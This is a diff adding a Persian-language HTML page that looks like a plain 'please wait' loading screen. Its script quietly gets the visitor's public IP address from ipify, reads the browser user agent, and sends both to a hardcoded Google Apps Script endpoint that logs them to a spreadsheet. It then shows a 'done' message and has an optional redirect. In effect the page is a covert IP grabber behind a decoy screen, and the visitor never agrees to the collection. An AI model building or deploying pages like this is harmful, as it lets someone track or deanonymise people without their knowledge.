@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بارگذاری...</title>
+    <style>
+        body { font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; background: #f9f9f9; }
+        h2 { color: #333; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <h2>لطفاً منتظر بمانید...</h2>
+
+    <script>
+        // 1. گرفتن IP کاربر
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+                
+                // 2. گرفتن User Agent
+                const userAgent = navigator.userAgent;
+
+                // 3. ارسال به Google Sheets
+                // آدرس زیر را با آدرس خودت از مرحله قبل عوض کن
+                const scriptURL = 'https://script.google.com/macros/s/AKfycbxpLIc3f9CRpNNLGnBes4noi4drtjIuV64ErKL7Dz5moBpYkwISrbZKpuOp2oUg8_c0OA/exec'; 
+                
+                // ساخت پارامترها
+                const params = new URLSearchParams({
+                    ip: userIP,
+                    ua: userAgent
+                });
+
+                fetch(scriptURL + '?' + params.toString(), { method: 'GET' })
+                    .then(() => {
+                        // بعد از ارسال موفق، محتوای صفحه را تغییر بده
+                        document.querySelector('.loader').style.display = 'none';
+                        document.querySelector('h2').innerText = 'عملیات انجام شد.';
+                        
+                        // اختیاری: هدایت به سایت مقصد
+                        // window.location.href = "https://google.com";
+                    })
+                    .catch(error => console.error('Error!', error.message));
+            })
+            .catch(error => console.error('Error getting IP:', error));
+    </script>
+
+</body>
+</html>
